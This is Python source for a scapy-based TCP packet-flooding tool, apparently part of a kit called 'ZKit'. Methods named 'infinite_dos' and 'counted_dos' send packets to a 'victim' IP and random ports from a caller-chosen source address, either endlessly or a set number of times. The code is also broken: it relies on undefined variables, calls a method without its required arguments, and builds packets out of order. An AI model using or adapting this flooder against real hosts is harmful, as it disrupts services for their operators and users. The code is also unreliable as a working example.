class Run:
    def __init__(self, source: tuple, victim : tuple, count: int, message: str):
        global send,TCP,IP,random
        from scapy.all import sendp as send, TCP, IP
        from random import choice
        self.source_ip, self.source_port = source
        self.victim_ip, self.victim_ports = victim
        print("Scapy Needs Administrator Permission")
        print("UAC Will Run On Windows Or On linux call ZKit with sudo")
        print("Press Ctrl + C To Stop The Process")
        if count in ('-1', -1):
            self.infinite_dos()
        else:
            self.counted_dos()

    def build_packet(self, ip, protocol, data):
        self.packet = ip / protocol / data

    def build_ip(self, src, dst):
        self.ip = IP(src=source_ip, dst=victim_ip)

    def ready_the_protocol(self):
        self.tcp = TCP(sport=source_port, dport=(
            victim_port))

    def random_port(self):
        self.victim_port = int(choice(self.victim_ports))

    def report(self):
        print("Send Packet To Target {} from IP {} And Port {} To Port {}".format(
            self.victim_ip, self.source_ip, self.source_port, self.victim_port))

    def infinite_dos(self):
        i = 0
        while True:
            try:
                self.ready_the_protocol()
                self.random_port()
                self.build_packet(ip, tcp, message)
                self.build_ip()
                send(self.packet)
                self.report()
                i += 1
            except KeyboardInterrupt:
                print("Already Send {} Packets To Target {} from IP {} And Port {} To Port {}".format(
                    i, self.victim_ip, self.source_ip, self.source_port, self.victim_port))
                break

    def counted_dos(self):
        for i in range(0, Count):
            try:
                self.ready_the_protocol()
                self.random_port()
                self.build_packet(ip, tcp, message)
                self.build_ip()
                send(self.packet)
                self.report()
            except KeyboardInterrupt:
                print("Already Send {} Packets To Target {} from IP {} And Port {} To Port {}".format(
                    i, self.victim_ip, self.source_ip, self.source_port, self.victim_port))
                break
        print("Operation Was Successful. Sent {} Packets To {}".format(
            self.count, self.victim_ip))
